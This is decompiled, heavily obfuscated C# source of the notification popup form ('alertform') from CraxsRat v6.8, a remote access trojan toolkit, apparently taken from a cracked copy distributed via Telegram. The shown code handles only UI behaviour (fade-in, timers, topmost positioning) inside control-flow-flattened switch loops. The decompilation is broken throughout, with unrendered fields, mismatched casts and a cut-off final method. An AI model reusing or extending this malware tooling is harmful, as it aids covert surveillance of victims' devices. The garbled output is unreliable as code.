// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.alertform
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class alertform : Form
  {
    [SpecialName]
    public int value__;
    public const ZoomPictureBox.ZoomType MousePosition = ; // Unable to render the field
    public const ZoomPictureBox.ZoomType ControlCenter = ; // Unable to render the field
    public const ZoomPictureBox.ZoomType ImageCenter = ; // Unable to render the field
    private IContainer components;
    private Label msglabel;
    public static byte f004978;
    public string TheMessage;
    public int oldY;

    private virtual PictureBox pictureBox2
    {
      [CompilerGenerated, SpecialName] get => ((alertform) this)._pictureBox2;
      [CompilerGenerated, SpecialName, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(((alertform) this).PictureBox2_Click);
label_1:
        int num1 = 1707185608;
        PictureBox pictureBox2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~((num1 ^ -1947674363 * (-1710517373 ^ 271865888)) - (-(~372749457 - ~1809166312) - (--554594396 * 643395617 - -1036657707 * 1026283655 * 901258337))) + ~-2103074816 * -557623275) ^ 1616018035)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              pictureBox2.Click += eventHandler;
              num1 = (int) num2 * 1869904247 ^ -1635943935;
              continue;
            case 2:
              pictureBox2 = ((alertform) this)._pictureBox2;
              num1 = (int) num2 * -1918142131 ^ -371224655;
              continue;
            case 3:
              pictureBox2.Click -= eventHandler;
              num1 = (int) num2 * 703194225 ^ 1791770158;
              continue;
            case 4:
              int num3 = pictureBox2 == null ? 1285671466 : (num3 = -1686856473);
              num1 = num3 ^ (int) num2 * -527333208;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = pictureBox2 == null ? -700214195 : (num4 = -808617919);
              num1 = num4 ^ (int) num2 * 37051495;
              continue;
            case 7:
              ((alertform) this)._pictureBox2 = value;
              num1 = 767335067;
              continue;
            case 8:
              pictureBox2 = ((alertform) this)._pictureBox2;
              num1 = (int) num2 * -240177157 ^ -847986009;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int x,
      int y,
      int cx,
      int cy,
      uint uFlags);

    protected override void OnLoad(EventArgs e)
    {
      base.OnLoad(e);
      alertform.SetWindowPos(this.Handle, new IntPtr(-1), this.Left, this.Top, this.Width, this.Height, 80U);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing)
      {
label_1:
        int num1 = -594472850;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~-(1463989525 * (1549136378 - 2141281865) - -((num2 + ~(2023316937 - 1778797779 - ~1119508892 + -1477717255 * (1552761552 - -45662561) ^ 1600855942 * 1729211291)) * 1120755539))) % 4U)
          {
            case 0:
              this.components.Dispose();
              num1 = (int) num3 * -425816364 ^ 1579568620;
              continue;
            case 1:
              int num4 = this.components == null ? -1654500063 : (num4 = 647692130);
              num1 = num4 ^ (int) num3 * 949213821;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
      }
label_5:
      base.Dispose(disposing);
    }

    protected override bool ShowWithoutActivation => true;

    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.alertimage = new PictureBox();
      // ISSUE: reference to a compiler-generated method
      ((ZoomPictureBox) this).set_pictureBox2(new PictureBox());
label_1:
      int num1 = -1730896689;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * -2005980287 - ((--756209385 ^ ~-366615085 - -1601737814) + 1522027619 * (560765179 - 69776469 - (731960503 + 1388430402))) - -(-1458590894 - (1051866843 - 188292374)) - --684428478)) % 58U)
        {
          case 0:
            this.backpanel.SuspendLayout();
            num1 = (int) num2 * -1628142997 ^ 402016227;
            continue;
          case 1:
            this.lidlamb.FillColor = Color.Transparent;
            num1 = (int) num2 * 417256207 ^ -2048356458;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Location = new Point(388, 0);
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Margin = new Padding(4);
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Name = EXGuarder.\u0031A680450;
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Size = new Size(27, 76);
            num1 = (int) num2 * 566648752 ^ 607513478;
            continue;
          case 3:
            this.BackColor = Color.Black;
            num1 = (int) num2 * -683593122 ^ 1138743357;
            continue;
          case 4:
            this.alertimage.TabIndex = 0;
            this.alertimage.TabStop = false;
            num1 = (int) num2 * -1834253583 ^ -190034812;
            continue;
          case 5:
            this.backpanel.Location = new Point(0, 0);
            this.backpanel.Margin = new Padding(4, 5, 4, 5);
            this.backpanel.Name = EXGuarder.\u0036B2E090D;
            num1 = (int) num2 * -194849055 ^ 850220080;
            continue;
          case 6:
            this.backpanel.TitleHeight = 0;
            num1 = (int) num2 * 1991989958 ^ -368078339;
            continue;
          case 7:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().SizeMode = PictureBoxSizeMode.Zoom;
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().TabIndex = 1;
            num1 = (int) num2 * 889510681 ^ -1513479651;
            continue;
          case 8:
            ((ISupportInitialize) this.alertimage).EndInit();
            // ISSUE: reference to a compiler-generated method
            ((ISupportInitialize) ((ZoomPictureBox) this).get_pictureBox2()).EndInit();
            num1 = (int) num2 * 2026372453 ^ 1809266303;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Dock = DockStyle.Right;
            num1 = (int) num2 * -1252541973 ^ 1073419644;
            continue;
          case 10:
            this.lidlamb.Font = new Font(EXGuarder.\u00350257073, 12f);
            this.lidlamb.ForeColor = Color.Lime;
            this.lidlamb.Location = new Point(0, 0);
            num1 = (int) num2 * -1319574097 ^ -1567477529;
            continue;
          case 11:
            this.lidlamb.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.lidlamb.Size = new Size(22, 76);
            this.lidlamb.Style = UIStyle.Custom;
            num1 = (int) num2 * 1428070018 ^ 1011105317;
            continue;
          case 12:
            this.backpanel.TitleColor = Color.Black;
            num1 = (int) num2 * -1767291290 ^ -1728267823;
            continue;
          case 13:
            this.alertimage.Name = EXGuarder.\u0036E307114;
            num1 = (int) num2 * -457561938 ^ 596084554;
            continue;
          case 14:
            this.msglabel.Text = EXGuarder.\u0033530644B;
            num1 = (int) num2 * -1344595693 ^ 696221112;
            continue;
          case 15:
            this.lidlamb.RectColor = Color.Transparent;
            num1 = (int) num2 * -189681184 ^ -1361171626;
            continue;
          case 16:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Image = (Image) Craxs_Rat.My.Resources.Resources.close48px;
            num1 = (int) num2 * 383012526 ^ 2099436865;
            continue;
          case 17:
            goto label_1;
          case 18:
            this.lidlamb.Name = EXGuarder.\u0035B32085C;
            num1 = (int) num2 * 1738990087 ^ 1234259834;
            continue;
          case 19:
            this.ControlBox = false;
            this.Controls.Add((Control) this.backpanel);
            this.DoubleBuffered = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Margin = new Padding(4);
            num1 = (int) num2 * -1092450297 ^ -361450969;
            continue;
          case 20:
            this.msglabel = new Label();
            num1 = (int) num2 * 1827278291 ^ 213067063;
            continue;
          case 21:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().BackColor = Color.Transparent;
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().Cursor = Cursors.Hand;
            num1 = (int) num2 * 1389064839 ^ 30491451;
            continue;
          case 22:
            this.msglabel.ForeColor = Color.BlanchedAlmond;
            this.msglabel.Location = new Point(81, 0);
            num1 = (int) num2 * 1916236359 ^ -803085626;
            continue;
          case 23:
            // ISSUE: reference to a compiler-generated method
            ((ZoomPictureBox) this).get_pictureBox2().TabStop = false;
            num1 = (int) num2 * -130353482 ^ 886249548;
            continue;
          case 24:
            this.closetimer = new Timer(this.components);
            num1 = (int) num2 * 1465470123 ^ 1183133576;
            continue;
          case 25:
            this.alertimage.SizeMode = PictureBoxSizeMode.CenterImage;
            num1 = (int) num2 * -581840691 ^ -1987105410;
            continue;
          case 26:
            this.SuspendLayout();
            num1 = (int) num2 * 2126249584 ^ 731506975;
            continue;
          case 27:
            this.msglabel.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 1127430189 ^ -1076739180;
            continue;
          case 28:
            this.lidlamb.Dock = DockStyle.Left;
            num1 = (int) num2 * 1568636703 ^ 153398922;
            continue;
          case 29:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num2 * 1845842882 ^ -98381578;
            continue;
          case 30:
            // ISSUE: reference to a compiler-generated method
            this.backpanel.Controls.Add((Control) ((ZoomPictureBox) this).get_pictureBox2());
            this.backpanel.Controls.Add((Control) this.alertimage);
            num1 = (int) num2 * 374790683 ^ 1986061188;
            continue;
          case 31:
            goto label_3;
          case 32:
            this.backpanel.RectColor = Color.FromArgb(245, 17, 5);
            num1 = (int) num2 * -1017140487 ^ -442859927;
            continue;
          case 33:
            this.backpanel.Controls.Add((Control) this.lidlamb);
            num1 = (int) num2 * -1580041810 ^ -1882623021;
            continue;
          case 34:
            this.msglabel.Name = EXGuarder.\u0031D0D7064;
            this.msglabel.Size = new Size(307, 76);
            this.msglabel.TabIndex = 2;
            num1 = (int) num2 * -833203616 ^ -1261768763;
            continue;
          case 35:
            this.Opacity = 0.0;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            num1 = (int) num2 * -257397373 ^ 621143859;
            continue;
          case 36:
            this.msglabel.Font = new Font(EXGuarder.\u00350257073, 11f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -534992545 ^ 1353053563;
            continue;
          case 37:
            this.msglabel.TextAlign = ContentAlignment.MiddleLeft;
            this.closetimer.Interval = 40;
            this.backpanel.BackColor = Color.Transparent;
            num1 = (int) num2 * 538323543 ^ -1427521521;
            continue;
          case 38:
            this.backpanel.TitleInterval = 0;
            num1 = (int) num2 * -1001998002 ^ 1213846580;
            continue;
          case 39:
            this.Name = EXGuarder.\u00312742965;
            num1 = (int) num2 * 563015876 ^ -1579845810;
            continue;
          case 40:
            this.backpanel.ResumeLayout(false);
            num1 = (int) num2 * -1499075188 ^ -62126921;
            continue;
          case 41:
            this.msglabel.BackColor = Color.Transparent;
            this.msglabel.Dock = DockStyle.Fill;
            num1 = (int) num2 * 1428034402 ^ -2029888411;
            continue;
          case 42:
            this.backpanel.FillColor = Color.Black;
            this.backpanel.Font = new Font(EXGuarder.\u00350257073, 12f);
            this.backpanel.ForeColor = Color.White;
            num1 = (int) num2 * 926323712 ^ -698521510;
            continue;
          case 43:
            this.lidlamb.Symbol = 61713;
            num1 = (int) num2 * -1268453196 ^ -1093132494;
            continue;
          case 44:
            // ISSUE: reference to a compiler-generated method
            ((ISupportInitialize) ((ZoomPictureBox) this).get_pictureBox2()).BeginInit();
            num1 = (int) num2 * 1778865367 ^ 797135937;
            continue;
          case 45:
            this.alertimage.Size = new Size(59, 76);
            num1 = (int) num2 * 1166803052 ^ 483852726;
            continue;
          case 46:
            this.backpanel.Size = new Size(415, 76);
            num1 = (int) num2 * -1654193681 ^ -2117160748;
            continue;
          case 47:
            this.lidlamb.Cursor = Cursors.Hand;
            num1 = (int) num2 * -1774446320 ^ -645069739;
            continue;
          case 48:
            this.CausesValidation = false;
            this.ClientSize = new Size(415, 76);
            num1 = (int) num2 * -1989468031 ^ -339091788;
            continue;
          case 49:
            this.Text = EXGuarder.\u00302677066;
            num1 = (int) num2 * 1376134515 ^ -1112273224;
            continue;
          case 50:
            this.ResumeLayout(false);
            num1 = (int) num2 * -1217471978 ^ 918163394;
            continue;
          case 51:
            this.backpanel = new DrakeUITitlePanel();
            this.lidlamb = new DrakeUIButtonIcon();
            ((ISupportInitialize) this.alertimage).BeginInit();
            num1 = (int) num2 * -645010857 ^ -412190118;
            continue;
          case 52:
            this.alertimage.BackColor = Color.Transparent;
            this.alertimage.Dock = DockStyle.Left;
            this.alertimage.Image = (Image) Craxs_Rat.My.Resources.Resources.sucess48px;
            this.alertimage.Location = new Point(22, 0);
            this.alertimage.Margin = new Padding(4);
            num1 = (int) num2 * -625079865 ^ -1472946888;
            continue;
          case 53:
            this.backpanel.Controls.Add((Control) this.msglabel);
            num1 = (int) num2 * 2085588828 ^ 1258324779;
            continue;
          case 54:
            this.backpanel.Dock = DockStyle.Fill;
            num1 = (int) num2 * 930508308 ^ 992051925;
            continue;
          case 55:
            this.lidlamb.TabIndex = 3;
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num2 * -614853284 ^ 1902406370;
            continue;
          case 56:
            this.lidlamb.StyleCustomMode = true;
            num1 = (int) num2 * 44935041 ^ -1108842660;
            continue;
          case 57:
            this.backpanel.Style = UIStyle.Custom;
            this.backpanel.TabIndex = 3;
            this.backpanel.Text = (string) null;
            num1 = (int) num2 * -1149057168 ^ 276265789;
            continue;
          default:
            goto label_60;
        }
      }
label_3:
      return;
label_60:;
    }

    [field: AccessedThroughProperty("alertimage")]
    public virtual PictureBox alertimage { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Timer closetimer
    {
      get => this._closetimer;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Closetimer_Tick);
        Timer closetimer = this._closetimer;
label_1:
        int num1 = -697205908;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (~(~((-1062555211 ^ -1070605372 ^ --1729894249 + (557024567 - 1880437392) ^ ~1511952172) - (num2 - ((-1607089370 ^ 742407370 ^ -1400819348) + (--288849811 + (2043321781 - 735459427)) + 978299205 * (--893003369 + -1213960236) + -852487577 * 1119016636))) - -1921592067) - -1130768068)) % 7U)
          {
            case 0:
              closetimer.Tick -= eventHandler;
              num1 = (int) num3 * 1288360259 ^ 809813839;
              continue;
            case 1:
              int num4 = closetimer == null ? -331551776 : (num4 = -485069568);
              num1 = num4 ^ (int) num3 * 785467948;
              continue;
            case 2:
              this._closetimer = value;
              num1 = 362340841;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              closetimer.Tick += eventHandler;
              num1 = (int) num3 * 515101072 ^ -1462842888;
              continue;
            case 6:
              closetimer = this._closetimer;
              int num5 = closetimer == null ? 709834120 : (num5 = -418543548);
              num1 = num5 ^ (int) num3 * -173900904;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("backpanel")]
    internal virtual DrakeUITitlePanel backpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUIButtonIcon lidlamb
    {
      get => this._lidlamb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler1 = new MouseEventHandler(this.Lidlamb_MouseDown);
label_1:
        int num1 = -1048312861;
        DrakeUIButtonIcon lidlamb;
        MouseEventHandler mouseEventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 + (~-(-238427066 * 2001873669 + (1662953950 ^ 300501121)) + --((208588946 ^ -1517105181) * -735328239)) - ~(-(-1234708394 ^ 1733778148) - 27366464)) * -173466075)) % 9U)
          {
            case 0:
              lidlamb = this._lidlamb;
              num1 = (int) num2 * -1015666056 ^ -295778111;
              continue;
            case 1:
              this._lidlamb = value;
              num1 = 1751365932;
              continue;
            case 2:
              lidlamb.MouseDown -= mouseEventHandler1;
              lidlamb.MouseUp -= mouseEventHandler2;
              num1 = (int) num2 * 651285140 ^ 2049512498;
              continue;
            case 3:
              lidlamb.MouseDown += mouseEventHandler1;
              lidlamb.MouseUp += mouseEventHandler2;
              num1 = (int) num2 * -963756604 ^ 1733312644;
              continue;
            case 4:
              lidlamb = this._lidlamb;
              int num3 = lidlamb == null ? -129051433 : (num3 = 1448949233);
              num1 = num3 ^ (int) num2 * -882580235;
              continue;
            case 5:
              goto label_1;
            case 6:
              int num4 = lidlamb == null ? -1297433056 : (num4 = 1528589901);
              num1 = num4 ^ (int) num2 * -979803696;
              continue;
            case 7:
              mouseEventHandler2 = new MouseEventHandler(this.Lidlamb_MouseUp);
              num1 = (int) num2 * 830571082 ^ -779845889;
              continue;
            case 8:
              goto label_3;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      int hWnd,
      int hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    public static void ShowInactiveTopmost(Form frm)
    {
      alertform.ShowWindow(frm.Handle, 4);
label_1:
      int num1 = -1075216441;
      while (true)
      {
        int num2 = num1;
        uint num3;
        IntPtr handle;
        switch ((num3 = (uint) -((-1055193059 - ~(num2 * 586712589)) * 1776391353 * 2039097565)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            alertform.SetWindowPos(handle.ToInt32(), -1, frm.Left, frm.Top, frm.Width, frm.Height, 16U);
            num1 = (int) num3 * -601512844 ^ 966594732;
            continue;
          case 2:
            goto label_3;
          case 3:
            handle = frm.Handle;
            num1 = (int) num3 * -1698605303 ^ 597760766;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void FadeIn(Form o, int interval = 45)
    {
      // ISSUE: variable of a compiler-generated type
      alertform.VB\u0024StateMachine_39_FadeIn stateMachine39FadeIn = (alertform.VB\u0024StateMachine_39_FadeIn) new alertform();
label_1:
      int num1 = -536441811;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) -(-8446271 - 1738726771 - ~---num2)) % 6U)
        {
          case 1:
            // ISSUE: reference to a compiler-generated field
            stateMachine39FadeIn.\u0024State = -1;
            num1 = (int) num3 * -326217102 ^ 2018489132;
            continue;
          case 2:
            ((comptableform) stateMachine39FadeIn).\u0024VB\u0024Me = this;
            num1 = (int) num3 * -326138291 ^ -107671446;
            continue;
          case 3:
            ((comptableform) stateMachine39FadeIn).\u0024VB\u0024Local_o = o;
            ((comptableform) stateMachine39FadeIn).\u0024VB\u0024Local_interval = interval;
            num1 = (int) num3 * 613345366 ^ -1933919124;
            continue;
          case 4:
            goto label_1;
          case 5:
            ((comptableform) stateMachine39FadeIn).\u0024Builder = AsyncVoidMethodBuilder.Create();
            num1 = (int) num3 * 706039580 ^ -1453148269;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      ((comptableform) stateMachine39FadeIn).\u0024Builder.Start<alertform.VB\u0024StateMachine_39_FadeIn>(ref stateMachine39FadeIn);
    }

    public alertform(string msg)
    {
label_1:
      int num1 = 188201567;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-num1 ^ ~-611058081 ^ ~(-711572271 ^ 1576202046 ^ 1890951306 - 312927731) ^ 75851659 * 132579067) - (1621890578 - 175522341 - (1112357245 + 1193888465)) + (-167940961 - 1341919278) - -299379677)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.Load += new EventHandler(this.AlertForm_Load);
            this.components = (IContainer) null;
            // ISSUE: reference to a compiler-generated field
            ((alertform.VB\u0024StateMachine_39_FadeIn) this).counter = 1;
            num1 = (int) num2 * 1368310227 ^ 225572508;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated field
            ((alertform.VB\u0024StateMachine_39_FadeIn) this).hold = 50;
            this.InitializeComponent();
            this.TheMessage = msg;
            num1 = (int) num2 * -142642495 ^ 1813921639;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void AlertForm_Load(object sender, EventArgs e)
    {
      this.Opacity = 0.0;
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u003745F5E79, false) == 0)
        goto label_7;
label_1:
      int num1 = -453170400;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (475607571 - 683749639 - (~(~num2 + ~(~(-1502041773 - -1105137464) + ((-28242025 ^ -1461083660) - 2135528862))) + --1464231412) - -1776069312)) % 7U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            this.oldY = checked (((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea.Bottom - this.Size.Height - 10);
            num1 = (int) num3 * -160624992 ^ -158737565;
            continue;
          case 2:
            this.TheMessage = Codes.Translate(this.TheMessage, EXGuarder.\u0034C065D00, EXGuarder.\u0033D6E5876);
            num1 = (int) num3 * 1980070574 ^ 2040336086;
            continue;
          case 3:
            goto label_7;
          case 4:
            int num4 = Operators.CompareString(language, EXGuarder.\u00369143C04, false) != 0 ? -474317368 : (num4 = -1832790255);
            num1 = num4 ^ (int) num3 * 1147982356;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.msglabel.Text = this.TheMessage;
            // ISSUE: reference to a compiler-generated field
            ((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea = Screen.GetWorkingArea((Control) this);
            num1 = -1453020555;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      int num5 = 1;
      do
      {
        try
        {
          string name = EXGuarder.\u003594F5E40 + Conversions.ToString(num5);
label_10:
          int num6 = -1680302305;
          while (true)
          {
            int num7 = num6;
            uint num8;
            alertform openForm;
            switch ((num8 = (uint) (475607571 - 683749639 - (~(~num7 + ~(~(-1502041773 - -1105137464) + ((-28242025 ^ -1461083660) - 2135528862))) + --1464231412) - -1776069312)) % 6U)
            {
              case 0:
                // ISSUE: reference to a compiler-generated field
                this.oldY = checked (((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea.Bottom - this.Size.Height - 10 - this.Height * num5);
                num6 = -714648987;
                continue;
              case 1:
                openForm = (alertform) Application.OpenForms[name];
                num6 = (int) num8 * -1508549641 ^ -1214637592;
                continue;
              case 2:
                goto label_10;
              case 4:
                goto label_13;
              case 5:
                int num9 = openForm != null ? -1306000349 : (num9 = -529619535);
                num6 = num9 ^ (int) num8 * 1813921831;
                continue;
              default:
                goto label_18;
            }
          }
label_13:
          this.Name = name;
          goto label_22;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_18:
        checked { ++num5; }
      }
      while (num5 <= 99);
label_19:
      int num10 = -1019529975;
label_20:
      while (true)
      {
        int num11 = num10;
        uint num12;
        switch ((num12 = (uint) (475607571 - 683749639 - (~(~num11 + ~(~(-1502041773 - -1105137464) + ((-28242025 ^ -1461083660) - 2135528862))) + --1464231412) - -1776069312)) % 4U)
        {
          case 0:
            this.FadeIn((Form) this);
            num10 = (int) num12 * 1669320594 ^ -447603816;
            continue;
          case 1:
            goto label_22;
          case 2:
            goto label_21;
          case 3:
            goto label_19;
          default:
            goto label_16;
        }
      }
label_21:
      return;
label_16:
      return;
label_22:
      // ISSUE: reference to a compiler-generated field
      this.Location = new Point(checked (((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea.Right - this.Size.Width), this.oldY);
      alertform.ShowInactiveTopmost((Form) this);
      num10 = 75452710;
      goto label_20;
label_7:
      this.TheMessage = Codes.Translate(this.TheMessage, EXGuarder.\u0034C065D00, EXGuarder.\u0032A5D4742);
      num1 = -912289776;
      goto label_2;
    }

    private void Closetimer_Tick(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (DateTime.Compare(((alertform.VB\u0024StateMachine_39_FadeIn) this).Showtime, DateTime.Now) >= 0)
          goto label_9;
label_1:
        int num1 = 311468626;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((num1 * -388514919 - -(72730705 * (827660654 - (35962362 - -266432053))) ^ 940971962 - 1214810771 - (-716303528 ^ -2109426821) - (~-1075760160 ^ 596279852 * 934401725) ^ 1802515781 * -2009361769) + (-470244567 ^ -250539472))) % 13U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated field
              ((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea = Screen.GetWorkingArea((Control) this);
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              this.Location = new Point(checked (((alertform.VB\u0024StateMachine_39_FadeIn) this).workingArea.Right - this.Size.Width), checked (this.oldY - ((alertform.VB\u0024StateMachine_39_FadeIn) this).counter));
              num1 = (int) num2 * 1095444789 ^ -355565632;
              continue;
            case 1:
              this.Name = EXGuarder.\u00343320213;
              num1 = (int) num2 * 1640646777 ^ 408360058;
              continue;
            case 2:
              this.closetimer.Dispose();
              num1 = (int) num2 * -139896375 ^ -2142338550;
              continue;
            case 3:
              num1 = (int) num2 * -650267885 ^ -2098925678;
              continue;
            case 4:
              this.closetimer.Stop();
              num1 = (int) num2 * 1011086952 ^ 1446387191;
              continue;
            case 5:
              goto label_9;
            case 6:
              goto label_3;
            case 7:
              this.Opacity = 0.0;
              num1 = (int) num2 * 597351112 ^ -1451948582;
              continue;
            case 8:
              // ISSUE: variable of a reference type
              int& local1;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: explicit reference operation
              int num3 = checked (^(local1 = ref ((alertform.VB\u0024StateMachine_39_FadeIn) this).hold) - 1);
              local1 = num3;
              num1 = 1926070217;
              continue;
            case 9:
              // ISSUE: variable of a reference type
              int& local2;
              // ISSUE: reference to a compiler-generated field
              // ISSUE: explicit reference operation
              int num4 = checked (^(local2 = ref ((alertform.VB\u0024StateMachine_39_FadeIn) this).counter) + 1);
              local2 = num4;
              this.Opacity -= 0.05;
              num1 = (int) num2 * 2113012396 ^ 1801001264;
              continue;
            case 10:
              this.Close();
              num1 = (int) num2 * 1226626933 ^ 1309213525;
              continue;
            case 11:
              goto label_1;
            case 12:
              num1 = (int) num2 * -762866077 ^ 1142278642;
              continue;
            default:
              goto label_16;
          }
        }
label_3:
        return;
label_16:
        return;
label_9:
        // ISSUE: reference to a compiler-generated field
        num1 = ((alertform.VB\u0024StateMachine_39_FadeIn) this).hold != 0 ? 1210934724 : (num1 = 159998167);
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void PictureBox2_Click(object sender, EventArgs e)
    {
      this.closetimer.Stop();
      this.closetimer.Dispose();
      this.Close();
    }

    private void Lidlamb_MouseDown(object sender, MouseEventArgs e)
    {
      this.closetimer.Stop();
label_1:
      int num1 = -856838526;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(1797673474 - ~(num2 ^ -147293709 * ((~1601201459 ^ 1695612509 ^ ~--22337169) + ((-172845453 ^ -1403963762 ^ -1443152317) + (~1612318469 ^ ~1038215071)))))) % 4U)
        {
          case 0:
            this.Close();
            num1 = (int) num3 * 343422570 ^ -506636252;
            continue;
          case 1:
            this.closetimer.Dispose();
            num1 = (int) num3 * 19462213 ^ -49168764;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    private void Lidlamb_MouseUp(object sender, MouseEventArgs e) => this.closetimer.Start();

    public alertform()
    {
    }

    [CompilerGenerated]
    internal void MoveNext()
    {
      // ISSUE: reference to a compiler-generated field
      int state = ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State;
      int num;
      try
      {
        switch (state)
        {
          default:
            try
            {
              TaskAwaiter taskAwaiter;
              if (state != 0)
              {
                if (state == 1)
                {
                  num = -1;
                  // ISSUE: reference to a compiler-generated field
                  ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State = -1;
                  return;
                }
              }
              else
              {
                num = -1;
                // ISSUE: reference to a compiler-generated field
                ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State = -1;
                taskAwaiter = ((comptableform) this).\u0024A0;
                ((comptableform) this).\u0024A0 = new TaskAwaiter();
                goto label_8;
              }
label_6:
              if (((comptableform) this).\u0024VB\u0024Local_o.Opacity < 1.0)
              {
                taskAwaiter = Task.Delay(((comptableform) this).\u0024VB\u0024Local_interval).GetAwaiter();
                if (!taskAwaiter.IsCompleted)
                {
                  num = 0;
                  // ISSUE: reference to a compiler-generated field
                  ((alertform.VB\u0024StateMachine_39_FadeIn) this).\u0024State = 0;
                  ((comptableform) this).\u0024A0 = taskAwaiter;
                  ref AsyncVoidMethodBuilder local1 = ref ((comptableform) this).\u0024Builder;
                  ref TaskAwaiter local2 = ref taskAwaiter;
                  // ISSUE: variable of a compiler-generated type
                  alertform.VB\u0024StateMachine_39_FadeIn stateMachine39FadeIn = (alertform.VB\u0024StateMachine_39_FadeIn) this;
                  ref alertform.VB\u0024StateMachine_39_FadeIn local3 = ref stateMachine39FadeIn;
                  local1.AwaitUnsafeOnCompleted<TaskAwaiter, alertform.VB\u0024StateMachine_39_FadeIn>(ref local2, ref local3);
                  return;
                }
              }
              else
              {
